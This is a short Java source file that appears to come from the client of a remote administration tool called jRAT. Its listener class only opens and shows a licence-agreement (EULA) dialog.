package su.jrat.client.listeners;

import su.jrat.client.ui.dialogs.DialogEula;

public class EulaListener extends Performable {

	@Override
	public void perform() {
		DialogEula frame = new DialogEula(true);
		frame.setVisible(true);
	}

}
